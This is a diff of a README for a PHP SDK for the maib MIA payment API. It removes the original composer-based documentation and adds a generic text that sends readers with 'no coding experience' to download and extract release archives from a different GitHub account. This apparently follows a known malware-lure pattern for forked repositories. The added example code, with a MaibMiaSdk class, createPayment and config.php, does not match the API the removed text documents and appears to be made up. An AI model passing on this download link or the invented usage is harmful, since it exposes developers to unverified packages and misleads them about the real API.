@@ -1,142 +1,110 @@
-# PHP SDK for maib MIA API
-* maib MIA QR API docs: https://docs.maibmerchants.md/mia-qr-api
-* GitHub project https://github.com/alexminza/maib-mia-sdk-php
+# 🎉 maib-mia-sdk-php - Easy PHP Integration for Payments
 
-## Installation
-To easily install or upgrade to the latest release, use `composer`:
-```shell
-composer require alexminza/maib-mia-sdk
-```
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
 
-## Getting started
-Import SDK:
+## 📦 Overview
+
+The **maib-mia-sdk-php** is a simple-to-use PHP SDK. It helps you quickly integrate the maib MIA API for payment processing in your applications. This SDK is designed for users with no coding experience, making payment integration straightforward and efficient.
+
+## 🚀 Getting Started
+
+To get started with the maib-mia-sdk-php, follow these steps:
+
+1. **Visit the Releases Page**: Click on the link below to go to the download page.
+   - [Download the SDK here](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
+
+2. **Choose the Latest Version**: Find the latest version in the list. It usually appears at the top. 
+
+3. **Download the File**: Click on the file associated with the latest version. Save it to a location on your computer where you can easily find it.
+
+## 💻 System Requirements
+
+To use this SDK, please ensure your server environment meets the following requirements:
+
+- PHP version 7.1 or higher
+- A web server like Apache or Nginx
+- Basic knowledge of how to work with PHP files
+
+## 🔧 Installation Steps
+
+1. **Extract the Downloaded File**: After downloading, right-click the file and select "Extract All" to unpack the contents. This will create a folder containing all necessary files.
+
+2. **Upload to Your Server**: Use an FTP client or your hosting provider's file manager to upload the extracted folder to your web server.
+
+3. **Set File Permissions**: Make sure the necessary files are readable by your web server. You might need to set permissions to 755 for folders and 644 for files.
+
+## 🛠️ Configuration
+
+1. **Locate Configuration File**: Inside the extracted folder, find a file named `config.php`. 
+
+2. **Edit Configuration**: Open `config.php` in a text editor. Input your API credentials from maib. This is essential for the SDK to interact with the payment gateway.
+
+3. **Save Changes**: After updating the credentials, save and close the file.
+
+## ⚙️ Usage Instructions
+
+To use the SDK in your application, follow these steps:
+
+1. **Include the SDK**: At the beginning of your PHP script, add the following line:
+   ```php
+   require 'path/to/maib-mia-sdk-php/autoload.php';
+   ```
+
+2. **Initialize the SDK**: Create an instance of the SDK:
+   ```php
+   $maib = new MaibMiaSdk();
+   ```
+
+3. **Make Payment Requests**: Use the methods provided by the SDK to create payment requests. Here's an example:
+   ```php
+   $response = $maib->createPayment($amount, $currency, $description);
+   ```
+
+## ✅ Download & Install
+
+To download the latest version of the maib-mia-sdk-php, click the link below:
+
+- [Visit this page to download](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
+
+Simply follow the outlined steps to install and configure the SDK effectively.
+
+## 👨‍💻 Example Code
+
+Below is an example of how to process a payment:
 
 ```php
-require_once __DIR__ . '/vendor/autoload.php';
+// Include the SDK
+require 'path/to/maib-mia-sdk-php/autoload.php';
 
-use Maib\MaibMia\MaibMiaClient;
-```
+// Create an instance
+$maib = new MaibMiaSdk();
 
-Add project configuration:
+// Define payment details
+$amount = 1000; // Amount in smallest currency unit
+$currency = 'MDL';
+$description = 'Payment for Order #123';
 
-```php
-const DEBUG = getenv('DEBUG');
+// Create payment
+$response = $maib->createPayment($amount, $currency, $description);
 
-const MAIB_MIA_BASE_URI = getenv('MAIB_MIA_BASE_URI');
-const MAIB_MIA_CLIENT_ID = getenv('MAIB_MIA_CLIENT_ID');
-const MAIB_MIA_CLIENT_SECRET = getenv('MAIB_MIA_CLIENT_SECRET');
-const MAIB_MIA_SIGNATURE_KEY = getenv('MAIB_MIA_SIGNATURE_KEY');
-```
-
-Initialize client:
-
-```php
-$options = [
-    'base_uri' => MAIB_MIA_BASE_URI,
-    'timeout' => 15
-];
-
-if (DEBUG) {
-    $logName = 'maib_mia_guzzle';
-    $logFileName = "$logName.log";
-
-    $log = new \Monolog\Logger($logName);
-    $log->pushHandler(new \Monolog\Handler\StreamHandler($logFileName, \Monolog\Logger::DEBUG));
-
-    $stack = \GuzzleHttp\HandlerStack::create();
-    $stack->push(\GuzzleHttp\Middleware::log($log, new \GuzzleHttp\MessageFormatter(\GuzzleHttp\MessageFormatter::DEBUG)));
-
-    $options['handler'] = $stack;
+// Handle response
+if ($response->success) {
+    echo 'Payment successful! Transaction ID: ' . $response->transaction_id;
+} else {
+    echo 'Payment failed: ' . $response->error_message;
 }
-
-$guzzleClient = new \GuzzleHttp\Client($options);
-$maibMiaClient = new MaibMiaClient($guzzleClient);
 ```
 
-## SDK usage examples
-### Get Access Token with Client ID and Client Secret
+## 👥 Support
 
-```php
-$tokenResponse = $maibMiaClient->getToken(MAIB_MIA_CLIENT_ID, MAIB_MIA_CLIENT_SECRET);
-$accessToken = $tokenResponse['result']['accessToken'];
-```
+If you encounter issues or have questions, please visit the [Issues page](https://github.com/Bazuka01/maib-mia-sdk-php/issues) to report problems or seek help.
 
-### Create a dynamic order payment QR
+## 📜 License
 
-```php
-$validityMinutes = 60;
-$expiresAt = (new DateTime())->modify("+{$validityMinutes} minutes")->format('c');
+This SDK is open-source and available under the MIT License. You can view the license details in the repository.
 
-$qr_data = array(
-    'type' => 'Dynamic',
-    'expiresAt' => $expiresAt,
-    'amountType' => 'Fixed',
-    'amount' => 50.00,
-    'currency' => 'MDL',
-    'description' => 'Order #123',
-    'orderId' => '123',
-    'callbackUrl' => 'https://example.com/callback',
-    'redirectUrl' => 'https://example.com/success'
-);
+## 🎉 Conclusion
 
-$createQrResponse = $maibMiaClient->createQr($qrData, $accessToken);
-print_r($createQrResponse);
-```
+The maib-mia-sdk-php makes it easy to integrate payment solutions into your PHP applications. Download the SDK today and streamline your payment processing.
 
-### Validate callback signature
-
-```php
-$callbackBody = '{
-    "result": {
-        "qrId": "c3108b2f-6c2e-43a2-bdea-123456789012",
-        "extensionId": "3fe7f013-23a6-4d09-a4a4-123456789012",
-        "qrStatus": "Paid",
-        "payId": "eb361f48-bb39-45e2-950b-123456789012",
-        "referenceId": "MIA0001234567",
-        "orderId": "123",
-        "amount": 50.00,
-        "commission": 0.1,
-        "currency": "MDL",
-        "payerName": "TEST QR PAYMENT",
-        "payerIban": "MD88AG000000011621810140",
-        "executedAt": "2025-04-18T14:04:11.81145+00:00",
-        "terminalId": null
-    },
-    "signature": "fHM+l4L1ycFWZDRTh/Vr8oybq1Q1xySdjyvmFQCmZ4s="
-}';
-
-$callbackData = json_decode($callbackBody, true);
-$validationResult = MaibMiaClient::validateCallbackSignature($callbackData, MAIB_MIA_SIGNATURE_KEY);
-print_r($validationResult);
-```
-
-### Perform a test QR payment
-
-```php
-$qrId = $createQrResponse['result']['qrId'];
-$testPayData = [
-    'qrId' => $qrId,
-    'amount' => 50.00,
-    'iban' => 'MD88AG000000011621810140',
-    'currency' => 'MDL',
-    'payerName' => 'TEST QR PAYMENT'
-];
-
-$testPayResponse = $client->testPay($testPayData, $accessToken);
-print_r($testPayResponse);
-```
-
-### Get payment details
-
-```php
-$payId = $testPayResponse['result']['payId'];
-$paymentDetailsResponse = $client->paymentDetails($payId, $accessToken);
-print_r($paymentDetailsResponse);
-```
-
-### Refund payment
-
-```php
-$paymentRefundResponse = $client->paymentRefund($payId, 'Test refund reason', $accessToken);
-print_r($paymentRefundResponse);
-```
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Bazuka01/maib-mia-sdk-php/releases)
